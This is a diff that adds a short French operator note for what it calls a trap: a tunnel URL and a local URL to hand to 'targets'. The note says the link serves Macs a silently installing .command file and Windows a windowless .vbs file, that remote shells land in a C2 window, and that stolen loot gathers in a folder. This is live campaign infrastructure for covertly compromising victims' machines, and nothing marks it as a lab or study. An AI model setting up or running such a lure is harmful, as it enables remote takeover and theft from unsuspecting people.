@@ -1,0 +1,17 @@
+==========================================
+   LE PIEGE - URL A DONNER AUX CIBLES
+==========================================
+
+URL publique (tout reseau) :
+  https://population-photographic-chart-fighter.trycloudflare.com
+
+URL reseau local :
+  http://192.168.1.222:8080/
+
+Le lien trie automatiquement :
+  Mac     -> portal.command   (install muette)
+  Windows -> portal_win.vbs   (install muette, zero fenetre)
+  Mobile  -> message informatif
+
+Les shells arrivent dans la fenetre c2.
+Le butin s'accumule dans Reception/ (bouton 3-VOIR-BUTIN).
